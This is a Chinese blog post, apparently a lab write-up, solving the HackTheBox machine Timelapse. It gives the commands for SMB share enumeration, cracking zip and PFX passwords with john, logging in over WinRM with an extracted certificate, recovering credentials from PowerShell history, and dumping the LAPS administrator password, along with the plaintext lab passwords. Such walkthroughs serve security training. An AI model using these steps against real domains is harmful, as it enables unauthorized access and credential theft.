> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 105篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsWWpKYQ30kOp5Mr1P2aMMqnBKqU9wCWOMSVDT7w3ib3YV9pVTErX0IhXIjd8r0A6fEtnFs5iaoEhMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
`靶机信息``靶机地址:``https://app.hackthebox.com/machines/Timelapse``靶场: HackTheBox.com``靶机名称: Timelapse``难度: 简单``提示信息:``无``目标:  user.txt和root.txt`
```

```
`实验环境``攻击机:Vbox Manjaro 10.10.16.43``靶机:windows 10.10.11.152`
```

**信息收集**
--------

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -p- 10.10.11.152
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
sudo nmap -sC -sV -p53,88,389,445,5986 10.10.11.152 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

扫描到多个开放端口，并且发现smb2服务和winrm远程管理端口5986。先来看看smb有没有泄露敏感信息

Smb2攻击
------

```
sudo enum4linux -a -u "guest" -p "" 10.10.11.152
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

扫描到共享目录Shares并且可以匿名访问，来验证下

```
smbclient -U guest "//10.10.11.152/shares"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录成功，检查里面的文件

```
`dir``cd Dev``dir``get winrm_backup.zip`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

找到一个备份压缩包，解压检查内容

```
unzip winrm_backup.zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

需要密码，生成hash尝试暴破

```
zip2john winrm_backup.zip > ziphash
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
john ziphash --wordlist=../../Dict/rockyou.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到密码，再次解压

```
unzip winrm_backup.zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

解压出winrm密钥文件legacyy_dev_auth.pfx，该文件是公钥加密技术12号标准：

```
 `公钥加密技术12号标准（Public Key Cryptography Standards #12，PKCS#12）为存储和传输用户或服务器私钥、公钥和证书指定了一个可移植的格式。它是一种二进制格式，这些文件也称为PFX文件。开发人员通常需要将PFX文件转换为某些不同的格式，如PEM或JKS，以便可以为使用SSL通信的独立Java客户端或WebLogic Server使用` `   是一种Microsoft协议，使用户可以将机密信息从一个环境或平台传输到另一个环境或平台。使用该协议，用户就可以安全地将个人信息从一个计算机系统导出到另一个系统中。`
```

将pfx中的key文件导出

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

需要密码，再来暴破下pfx的密码，同样是先生成hash文件再用john暴破

```
`pfx2john legacyy_dev_auth.pfx > pfxhash``john pfxhash --wordlist=../../Dict/rockyou.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到密码继续导出key

```
`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key``openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt`
```

提示Enter PEM pass phrase时需要为key文件设置一个密码

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到两个key文件后使用evil-winrm连接到主机

```
evil-winrm -i 10.10.11.152 -S -c pfx.crt -k pfx.key
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

输入证书设置的密码后登录成功，来找找敏感信息

```
`cd C:\Users\legacyy\desktop``dir``type user.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到user.txt，查看域信息

```
ipconfig /all
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

evil-winrm这个工具一直处理不好，找了两天也没解决，如果有人知道是什么问题请告知

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\目录下发现ConsoleHost_history.txt历史命令记录文件，下载下来查看内容

```
download "C:/Users/legacyy/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现用户svc_deploy和密码'E3R$Q62^12p7PLlC%KWaxuaV'，使用laps.py脚本导出域账号密码，需要绑定域名

laps.py仓库地址：

```
https://github.com/n00py/LAPSDumper
```

```
sudo nano /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
sudo py3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到管理员密码，继续使用evil-winrm登录

```
evil-winrm -i timelapse.htb -S -u Administrator -p 'Y1}n-C31L%Mde1;i2j.0-Ga@'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录成功，来找下flag

```
`cd C:\Users\trx\desktop``ls``type root.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)